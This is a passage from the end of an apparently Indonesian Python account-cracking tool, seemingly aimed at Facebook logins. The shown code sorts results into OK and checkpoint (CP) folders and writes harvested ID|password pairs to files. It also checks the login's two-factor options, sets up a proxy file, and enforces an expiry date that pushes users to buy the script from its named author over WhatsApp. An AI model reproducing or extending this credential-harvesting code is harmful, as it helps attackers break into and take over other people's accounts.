			print('\r                ➛ %sTap Yes / A2F [ Cek Login Di Lite/Mbasic%s ]'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s                ➛ %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r                ➛ %sTidak Dapat Mengecek Opsi [ Cek Login Di Lite/Mbasic ]%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		

#----------[BUAT RUN TOOLS SCRIPT INI]----------#
def make():
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.mkdir('/sdcard/dump')
	except:pass
	login()
	#getkey()

#----------[BUAT EXPIRED SCRIPT]----------#
expired = ['01', '07', '2024']
saat_ini = datetime.now()
tgl = saat_ini.strftime('%d')
bln = saat_ini.strftime('%m')
thn = saat_ini.strftime('%Y')
waktu_new = (tgl+"-"+bln+"-"+thn)

if __name__=="__main__":
	tanggal = thn + bln + tgl
	exp = expired[2] + expired[1] + expired[0]
	if tanggal >= exp:
		os.system("clear")
		print('\033[0m')
		cetak(nel(f"""[[red]•[white]] Script Kadaluarsa Silahkan Beli Scriptnya ke Authour Bimzzz.ae \n[[red]•[white]] WhatsApp : +6281229259881"""))
		os.system('xdg-open https://wa.me/6281229259881')
		sys.exit()
	else:
		os.system('git pull')
		make()
